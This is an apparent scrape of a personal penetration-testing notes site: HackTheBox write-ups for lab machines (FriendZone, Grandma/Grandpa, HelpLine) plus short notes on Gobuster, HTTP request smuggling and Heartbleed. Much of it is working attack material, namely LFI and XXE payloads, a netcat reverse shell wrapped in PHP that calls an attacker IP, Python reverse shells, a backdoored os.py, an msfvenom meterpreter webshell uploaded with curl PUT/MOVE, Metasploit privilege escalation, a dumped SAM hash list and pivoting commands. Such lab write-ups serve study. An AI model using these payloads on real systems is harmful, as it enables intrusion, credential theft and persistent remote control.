;; Query time: 39 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Tue Feb 12 17:45:45 EST 2019 ;; MSG SIZE rcvd: 56  dig axfr @10.10.10.123 friendzone.red ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.5-P1-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.123 friendzone.red ; (1 server found) ;; global options: +cmd friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red. 604800 IN AAAA ::1 friendzone.red. 604800 IN NS localhost. friendzone.red. 604800 IN A 127.0.0.1 administrator1.friendzone.red. 604800 IN A 127.0.0.1 hr.friendzone.red. 604800 IN A 127.0.0.1 uploads.friendzone.red. 604800 IN A 127.0.0.1 friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 43 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Tue Feb 12 17:46:46 EST 2019 ;; XFR size: 8 records (messages 1, bytes 289)  /dashboard.php?image_id=php://filter/convert.base64-encode/resource=/etc/passwd\u0026amp;pagename=expect://ls\nwfuzzing possible directories server-status was forbidden ooo\nLFI fuzzing\ndashboard.php?image_id=.%00\u0026amp;pagename=php://filter/convert.base64-encode/resource=timestamp HTTP/1.1   \u0026lt;?php $time_final = time() + 3600; echo \u0026quot;Final Access timestamp is $time_final\u0026quot;; ?\u0026gt;  DASHBOARD\n\u0026lt;?php //echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; //echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;title\u0026gt;FriendZone Admin !\u0026lt;/title\u0026gt;\u0026quot;; $auth = $_COOKIE[\u0026quot;FriendZoneAuth\u0026quot;]; if ($auth === \u0026quot;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026quot;){ echo \u0026quot;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; if(!isset($_GET[\u0026quot;image_id\u0026quot;])){ echo \u0026quot;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;image_name param is missed !\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;please enter it to show the image\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;default is image_id=a.jpg\u0026amp;pagename=timestamp\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; }else{ $image = $_GET[\u0026quot;image_id\u0026quot;]; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;img src='images/$image'\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Something went worng ! , the script include wrong param !\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026quot;; include($_GET[\u0026quot;pagename\u0026quot;].\u0026quot;.php\u0026quot;); //echo $_GET[\u0026quot;pagename\u0026quot;]; } }else{ echo \u0026quot;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;You can't see the content ! , please login !\u0026lt;/center\u0026gt;\u0026lt;/p\u0026gt;\u0026quot;; } ?\u0026gt;  UPLOAD.PHP\nTHIS WAS TRICKY HAD TO GUESS I MESSED UP AND KEPT ADDING THE DARN EXTENTION\nburp\n/dashboard.php?image_id=a.jpg\u0026amp;pagename=php://filter/convert.base64-encode/resource=../uploads/upload  upload.php\nPD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K  \u0026lt;?php // not finished yet -- friendzone admin ! if(isset($_POST[\u0026quot;image\u0026quot;])){ echo \u0026quot;Uploaded successfully !\u0026lt;br\u0026gt;\u0026quot;; echo time()+3600; }else{ echo \u0026quot;WHAT ARE YOU TRYING TO DO HOOOOOOMAN !\u0026quot;; } ?\u0026gt;  USER\ntaking all the bits and pieces here to get user. Remember the nmap scan that it showed the paths for the smb shares. This will help find the uploaded php shell. the use the lfi to run the script. It will smash the shell the script here is to keep it simple.\nSHELL ===\n\u0026lt;?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 9080 \u0026gt;/tmp/f') ?\u0026gt;  SMBCLIENT\nsmbclient -U info //10.10.10.123/Development  LFI\n/dashboard.php?image_id=a.jpg\u0026amp;pagename=php://filter/convert.base64-encode/resource=../../../../../etc/Development/pinkie2  LFI/RCE\n/dashboard.php?image_id=a.jpg\u0026amp;pagename=php://filter/resource=../../../../../etc/Development/pinkie2  PYTHON TTY\npython -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'  LinEnum\n  REPORTER.PY\n#!/usr/bin/python import os variables possibly usernames for shares to_address = \u0026quot;admin1@friendzone.com\u0026quot; from_address = \u0026quot;admin2@friendzone.com\u0026quot; print \u0026quot;[+] Trying to send email to %s\u0026quot;%to_address #####Command is commented out is a variable #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \u0026quot;PAPAP\u0026quot;''' python to run command line #os.system(command) # I need to edit the script later # Sam ~ python developer Sam username or the creator name.  Hmmmm, in the beginning it said contact us. the above python code is useless. it does provide email address and a password PAPAP\nSUID BINARIES\n/bin/fusermount /bin/umount /bin/mount /bin/su /bin/ntfs-3g /bin/ping /usr/bin/passwd /usr/bin/traceroute6.iputils /usr/bin/newgrp /usr/bin/sudo /usr/bin/gpasswd /usr/bin/chsh /usr/bin/chfn /usr/sbin/exim4 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign  WORLD WRITEABLE\nfind /usr/*/python2.7 -perm -o+w  /usr/lib/python2.7 /usr/lib/python2.7/sitecustomize.py /usr/lib/python2.7/config-x86_64-linux-gnu/libpython2.7.so /usr/lib/python2.7/os.py /usr/lib/python2.7/dist-packages/lsb_release.py  uploaded a python reverse shell from this link first. cd into python2.7 rm os.py upload a python script with a reverse shell named os.py\nAgpyu12!0.213$  import pty import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026quot;127.0.0.1\u0026quot;, 5038)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026quot;HISTFILE\u0026quot;,'/dev/null') pty.spawn(\u0026quot;/bin/bash\u0026quot;)  no pty\nimport pty import socket import subprocess s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026quot;127.0.0.1\u0026quot;, 5038)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;])  Okay So i was going in the wrong directions. i sat back and thought so go to /usr/lib/python2.7 edit os.py at the bottom.\n17system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 127.0.0.1 5038 \u0026gt;/tmp/f')  #\n"
},
{
	"uri": "/hackthebox/github/",
	"title": "GitHub",
	"tags": [],
	"description": "",
	"content": "  Hugo/Github/Power How to setup a Hugo Static WebPage using PowerShell on GitHub!\n  "
},
{
	"uri": "/webapp/gobuster/",
	"title": "GoBuster",
	"tags": [],
	"description": "",
	"content": "What is Gobuster? Gobuster is a web application fuzzer designed to enumerate Web Directories and Domains\nGobuster has been recently updated, it has some new features and they changed it everything around. It\u0026rsquo;s still the gobuster we Love but its different now it went though some changes. I\u0026rsquo;m not sure if the kali repo has updated yet, you may need to download gobuster form the github repo.\nExample\u0026rsquo;s For DIR:\n# This will FUZZ a web app that uses tls, then skip the cert and begin enumerating. gobuster dir -w /usr/share/dirbuster/wordlists/ -u https://ipaddres/domain -k -x txt,php,html -t 40 # This Web App requirers wildcards to FUZZ the webdirectories, so you have to use -s to filter out all the unwanted Status Codes. #below it will return everything but the 404 Status Codes. gobuster dir -w /usr/share/dirbuster/wordlists/ -u http://ipaddres/domain -x txt,oho,html -t 40 -wildcard -s \u0026quot;200,204,301,302,307\u0026quot; Here are the mosted used switches atleast for me. -w wordlist -u url above its https:// -k Skip ssl cert. this one is pretty neat i like it. -x extensions php,doc,html,aspx,asp,txt etc.... -s the return status codes. below there is a picture. \u0026quot;200,204,301,302,307,401,403\u0026quot; this is used in conjunction with the -wildcard switch. -t THREADS the spead it'll run at. -c Cookies you may need to use cookies everynow and again to validate the request. 'PHPSESSION=2181290932I01945594868971'  Examples for DNS:\nDIR SWITCHES\ngobuster dir {flags} Flags: -f, --addslash Append / to each request -c, --cookies string Cookies to use for the requests -e, --expanded Expanded mode, print full URLs -x, --extensions string File extension(s) to search for -r, --followredirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -h, --help help for dir -l, --includelength Include the length of the body in the output -k, --insecuressl Skip SSL certificate verification -n, --nostatus Don't print status codes -P, --password string Password for Basic Auth -p, --proxy string Proxy to use for requests [http(s)://host:port] -s, --statuscodes string Positive status codes (will be overwritten with statuscod esblacklist if set) (default \u0026quot;200,204,301,302,307,401,403\u0026quot;) -b, --statuscodesblacklist string Negative status codes (will override statuscodes if set) --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default \u0026quot;gobuster/3.0.1\u0026quot;) -U, --username string Username for Basic Auth --wildcard Force continued operation when wildcard found Global Flags: -z, --noprogress Don't display progress -o, --output string Output file to write results to (defaults to stdout) -q, --quiet Don't print the banner and other noise -t, --threads int Number of concurrent threads (default 10) --delay duration Time each thread waits between requests (e.g. 1500ms) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist  DNS SWITCHES\nUsage: gobuster dns [flags] Flags: -d, --domain string The target domain -h, --help help for dns -r, --resolver string Use custom DNS server (format server.com or server.com:port) -c, --showcname Show CNAME records (cannot be used with '-i' option) -i, --showips Show IP addresses --timeout duration DNS resolver timeout (default 1s) --wildcard Force continued operation when wildcard found Global Flags: -z, --noprogress Don't display progress -o, --output string Output file to write results to (defaults to stdout) -q, --quiet Don't print the banner and other noise -t, --threads int Number of concurrent threads (default 10) --delay duration Time each thread waits between requests (e.g. 1500ms) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist  "
},
{
	"uri": "/hackthebox/boxes/grand-pa/",
	"title": "GrandMa",
	"tags": [],
	"description": "",
	"content": "Started out with nmap moved into enumeration with gobuster to enum web directories.\nNmap\n![gobuster](https://chickenpwny.github.io/images/grandma/gobuster.PNG)nmap -sV -sC -T5 -p80 -oA total-first 10.10.10.15 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 20:05 EDT Nmap scan report for 10.10.10.15 Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Server Date: Sun, 30 Jun 2019 23:58:45 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 |_ WebDAV type: Unkown Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  Gobuster ### Remember when you using gobuster on a windows system to look for windows files with -x\ngobuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -u http://10.10.10.14/ -x aspx,txt,html -t 200  OPTIONS web request parameter. used below will return the type of webrequest allowed.\nGoogle says the put method is used to completely overwrite whatever is currently existing url. im going to try and use that to add a php backdoor. Got to remember were on a windows host luckley kali linx comes with a aspx page that will give us command injection.\nThen using the two web request methods put and move to first upload a file then use move to rename the file to aspx. First make a malicious aspx file using msfvenom. then using curl upload the file and rename it using the move request. Using\nmsfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.2 LPORT=443 \u0026gt; pinkie.aspx  MetaSploit Now, need to setup a multi/handler on a msfconsole/metasploits. I like to run msfconsole from the shortcut link on kali. mostly because it sets up everything the database and supporting files.\nuse multi/handler set payload windows/meterpreter/reverse_tcp set LHOST adddresss set LPORT port number run  MALICIOUS ASPX I thought using curl was pretty cool.\ncurl -X PUT http://10.10.10.15/pinkie.txt --data-binary @pinkie.aspx curl -X MOVE -H 'Destination: http://10.10.10.15/pinkie.aspx' http://10.10.10.15/pinkie.txt curl http://10.10.10.15/pinkie.aspx  You may wish to delete soemthing.\ncurl -X DELETE http://10.10.10.15/pinkie.txt  I would like to note that 0xdf initially used the -d switch instead of \u0026ndash;data-binary. similar to ftp binary mode.\n-d switch is forr data --data-binary  Privilege Escalation\nUsing metasploit to get a shell, well background the current session then use local_exploit_suggester to find out what exploits to use. You may use any vulnerable exploit listed. trackpop_menu seems to work the best some of the other don\u0026rsquo;t properly elevate like ms16_075_reflection\nexploit/windows/local/ms14_058_track_popup_menu exploit/windows/local/ms14_070_tcpip_ioctl exploit/windows/local/ms15_051_client_copy_image exploit/windows/local/ms16_075_reflection exploit/windows/local/ms16_075_reflection_juicy  background once the session is elevated. type hashdump this will pull the password hashes from SAM \u0026amp; system. we could use this to login into smb\nhashdump  Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca::: ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88::: IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16::: Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c::: SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::  Pivoting to Grandpa\nChanging ip tables so we can\u0026rsquo;t access it from out machine. removing any confusing. ippsec demonstration of this is pretty neat. first ping grandpa to verify it is up. next well go to our iptables and tell or host to drop outbound traffic to grandpa.\nping 10.10.10.14  After, running the command below ping should, stop and produce a permissions denied error.\niptables -A OUTPUT -d 10.10.10.14 -j DROP  back on grandma well turn off the firewall.\nnetsh firewall set opmode disable  Next,well add a route to 10.10.10.14 inside msfconsole. background the session well portfwd to 10.10.10.15\nroute add 10.10.10.14 3 3 is the session number might be different.  portfwd add -L 10.10.10.15 -l 6000 -p 7000 -r 10.10.14.2  portfwd add -l 445 -p 445 0r 127.0.0.1  next, background it until you escape the session. At this point i would like to point out we can scan 10.10.10.14 figure out what is running.\nnmap -sC -sV -p80 10.10.10.14 -T5 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 15:36 EDT Nmap scan report for grandma.htb (10.10.10.14) Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH | http-ntlm-info: | Target_Name: GRANPA | NetBIOS_Domain_Name: GRANPA | NetBIOS_Computer_Name: GRANPA | DNS_Domain_Name: granpa | DNS_Computer_Name: granpa |_ Product_Version: 5.2.3790 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Error | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | WebDAV type: Unkown | Server Type: Microsoft-IIS/6.0 | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK |_ Server Date: Sun, 30 Jun 2019 19:29:47 GMT Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds  ippsec used this webdav bufferoverflow exploit to gain a foothold on grandpa. \u0026ldquo;buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in IIS 6.0 in Microsoft windows server 2003 r2 allows remote attackers to execute arbitrary code via a long header beginning with \u0026rdquo; If: \u0026lt;http://\u0026rdquo; in a PROPFIND request, as exploited in the wild in July August 2016.\u0026rdquo;\nippsec summarized it that it\u0026rsquo;s entering a bunch of A\u0026rsquo;s into the url and exceeding what the web server can handle.\nThe hint for the exploit is suppose to be the server version 2003 r2 and the year of the system.\nexploit/windows/iis/iis_webdav_scstoragepathfromurl  Once a shell is established need to elevate the shell using one of the ones mentioned above copy image worked fine. for me.\nWireShark - It was pretty neat seeing the connection start. Seeing the payload cross the network to hit its target.\n"
},
{
	"uri": "/webapp/http-smuggling/",
	"title": "HTTP SMUGGLING",
	"tags": [],
	"description": "",
	"content": "HTTP Smuggling is an old attack, what\u0026rsquo;s new is that it\u0026rsquo;s still around. This is due to complex nature of modern day Web Applications. This will be me just going over documentation how to execute this attack, the implications, how to resolve it.\nThis is an old attack made popular by\nhttps://portswigger.net/web-security/request-smuggling\nSome server support transfer-encoding headers which, breaks up request. There are ways to confuse the front end of a website because of the very nature of the environment. How the environment reads requests.\nEncoding us useally enabled but there are controls in place \u0026ldquo;filters\u0026rdquo;, these can be bypassed the controls are very smart. XD think it\u0026rsquo;s a white list of characters to look for.\nCONTENT LENGTH\nBypassing the front in CL:TE\nthe front end will forward the request to the backend. the backend will read the Transfer Encoding see the request has a content length of zero and will treat everything below as a valid request. this works.\nWhen we send a request through burp notice it hangs. go refresh the browser page and it send it through creepy right?\nFAILS\nTE.CL The third trial. obfuscating the TE header\n\u0026quot;HTTP request smuggling, obfuscating the TE header. This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. \u0026quot;  This should be easy, not. lol\nHINT\nManually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.  Transfer-Encoding: xchunked Transfer-Encoding: zchunked Transfer-Encoding : chunked this is a string to be done together it reads the last one and is like oh it's not here lol something liek that Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked  So, obfuscation here is neat as mentioned above some of the examples come in paids. the web request will read the last one and be like it\u0026rsquo;s not here. the back ened will read transfered chunks xD. to funny\nHere we will poison the default page to redirect to poo.\nGetting the content legnth right was tricky lol\nSo after entering the request twice we get a unrecognized method GPOST. You can change the x to certain characters but nothing all to special. this is pretty neat. you can\u0026rsquo;t fill in the x parameter because i believe it\u0026rsquo;s reading the zero as apart of the the parameter ohhhhh. it has to be exactly right to work. SUBMIT TWICE.\nJESUS CHRIST\nsolving TE:CL was kind of tough im not sure what 5c is but i think it\u0026rsquo;s away to obfuscate the length in hex or something.\nSo, hidden characters can really screw with you here. behold the lies,\nIm kind of liking this trick.\n"
},
{
	"uri": "/hackthebox/",
	"title": "HackTheBox",
	"tags": [],
	"description": "",
	"content": "HackTheBox\n Boxes Boxes ``` FTP FILE TRANSFER PROTOCOL SSH secure shell HTTP and an unknown port protected H2 database on 8082 GOBUSTER Arkhams Bastions Blue Blue Special thanks to IppSec for contributing to this post. Please Subscribe changes /etc/hosts so 10.10.10.40 blue.htb PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed.\n  GitHub  Hugo/Github/Power How to setup a Hugo Static WebPage using PowerShell on GitHub!   Miscellaneous Setting up Test Enviroment or Complicated tools.   TMUX TMUX okay, because my kali linux crash i had to reintall tmux. i really like gpakaosz theme pack for tmux. cd into your home directory, then create a symlink to .tmux.conf so when tmux runs it will look in you\u0026rsquo;re \u0026ldquo;home\u0026rdquo; directory in kali thats ~/ or /root/ apt-get install tmux cd ~/ git clone ln -s .tmux/.tmux.conf -f force cp .tmux/.tmux.conf.local .   "
},
{
	"uri": "/concepts/webapppentest/heartbld/",
	"title": "HeartBleed",
	"tags": [],
	"description": "",
	"content": "Heart bleed is an OpenSSL vulnerability that allows the attacker to �bleed� out whatever in memory on the server. You can also dump the TSL/SSL cert for the webpage. You can modify the exploit to continuously extract data at 64 bytes at a time. Messing around with the POC was tricky the c code has all these errors and won�t compile arg, luckily for me, Metasploit has the solution.\nProff of concept https://www.exploit-db.com/exploits/32745/\nMetasploit: https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed\n"
},
{
	"uri": "/hackthebox/boxes/helpline/writeup/",
	"title": "HelpLine-WriteUp",
	"tags": [],
	"description": "",
	"content": " This box was allot of fun it was created by @egr355. The webpage is running service engine(manage engine). That uses default credentials there are some clues in the there that are obscure and kind of hidden. I initially missed that and used FlameOfIgnis exploit that will elevate a user to any known username. using some form of php type juggling. That\u0026rsquo;s not needed, Find some credentials inside a excel file that hides the passwords. Well use the credentials to login into smb and find some more credentials that will lead to a shell as alice.\nEnumating applocker \u0026amp; awhole bunch of other stuff. there are extra drives, well find where manage engine is hosted. and use psql to find saved credentials. thanks to password reuse well be able to login as tolu. gain even more permissions to the E: drive. well find the backup script used maintain the webapp. the script takes input form a file then backups up the file listed. it uses invoke expressions, well use that to get command injection. gain a nishang shell as leo, leo well find a powershell secure string. well do some powerfoo and decrypt the string into a plaintext.\nlogin as adminsitrator to gain root.\nnmap -sT -Pn -p- -T5 --min-rate=10000 10.10.10.132 Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-31 18:12 EDT Nmap scan report for HELPLINE (10.10.10.132) Host is up (0.056s latency). Not shown: 65530 filtered ports PORT STATE SERVICE 135/tcp open msrpc 445/tcp open microsoft-ds 5985/tcp open wsman 8080/tcp open http-proxy  WebPage ManageEngine9.3\nManage Engines Default Credentials are Guest \u0026amp; Guest.\nOnce, logged in you will notice there isn\u0026rsquo;t allot gong on. This led me to do some research on cve\u0026rsquo;s and ways to exploit version 9.3. there are a bunch of great tricks i covered in my notes. Navigating to the solutions page was written by luis ribeiro. A real user, so this is a clue. youll notice only one of the solutions has an attachment.\nPassWordAudit\nFound a excelsheet. i installed openoffice to view the .xlsx file. The initial finding are underwhelming but some content has been hidden. Go to format \u0026gt; select sheet \u0026gt; show. this will show all hidden sheets. Which will reveal some more notes. We find usernames, passwords. it also reveals some of the finer details privileges which accounts share the same password. Also what systems are associated with the passwords. we become aware of a directory it_logins.txt\nThe recent penetration test revealed some accounts with weak password security, probably there are more. We should also consider something that can automate account discovery.Please update this document with any accounts/logins which you suspect have weak / easily guessable passwords. \n   oracle scott tiger priv     wordpresshydra admin megabank1 priv   windows 7 local admin Administrator Megabank123!    MFT download clients megabank1    jump box gavin  priv    The biggest clue of all was. File containing details from subsequent audit saved to C:\\Temp\\Password Audit\\it_logins.txt on HELPLINE\nIf you go to my notes there are some interesting things about how to enumerate users with wfuzz \u0026amp; burp.\n**XXE - Stand for XML External Entity traversal **\nan xxe attack takes advantage of how an application parses xml input. since the webserver will return the output of the xml file. Xml entity allows us to read files on the system/disk. The header creates a external entity thats using a system call and assigns it to the variable in the xml file. printing the contenets of any file on the system.\nThe first reference will help understand the different elements of xxe vuln. the second provice a proof of concept script that verifies this vuln works. It help understand what was needed and what was not. The last was the most helpful but getting it to work was tricky\n\t### references ###   https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/ https://github.com/devcoinfet/Manage-Engine-9.3-xxe-/commit/624ca1cdcc126a5396e652aebedbf3a85256d058 https://labs.integrity.pt/advisories/cve-2017-9362/index.html  Below is the first valid response that wasn\u0026rsquo;t a 3002 or 3026 xml errors. foo \u0026amp; file are variables that can b arbitrarily replace, except file:///. also the order matters in the labs.integrity didn\u0026rsquo;t add the xml version part. To get it to work on this system need to add the api version. then incert the variable in value.\ni used cyber-chef to url-encode the strings. burp just does a whacky lame job of encoding in my opinion. crt+u then crtl + u it will encode the + to %2b instead of %20\nOPERATION_NAME=add\u0026amp;INPUT_DATA=\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY file SYSTEM \u0026quot;file:///C:\\Temp\\Password Audit\\it_logins.txt\u0026quot;\u0026gt;]\u0026gt; \u0026lt;API version='1.0' locale='en'\u0026gt; \u0026lt;value\u0026gt;\u0026amp;file;\u0026lt;/value\u0026gt; \u0026lt;/API\u0026gt;  without the xml version it will give a xml error.\nThis produced the desired output. in the next section i played around with how much i need to get the same output.\nliOPERATION_NAME=add\u0026amp;INPUT_DATA=\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY file SYSTEM \u0026quot;file:///C:\\Temp\\Password Audit\\it_logins.txt\u0026quot;\u0026gt;]\u0026gt; \u0026lt;API version='1.0' locale='en'\u0026gt; \u0026lt;records\u0026gt; \u0026lt;record\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;CI Name\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;Tomcat Server 3\u0026amp;file;\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;CI Type\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;Business Service\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Site\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;(empty)\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Business Impact\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;High\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Description\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;Domain Conroller \u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Availability Target(%)\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;200\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Service Support Hours\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;24X5\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Cost\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;8080\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Incident restoration target\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;90%\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;/record\u0026gt; \u0026lt;/records\u0026gt; \u0026lt;/API\u0026gt;  So most of the stuff is just fluff and not necessary to get it run.\nOPERATION_NAME=add\u0026amp;INPUT_DATA=\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY pie SYSTEM \u0026quot;file:///C:\\Temp\\Password Audit\\it_logins.txt\u0026quot;\u0026gt;]\u0026gt; \u0026lt;API version='1.0' locale='en'\u0026gt; \u0026lt;records\u0026gt; \u0026lt;record\u0026gt; 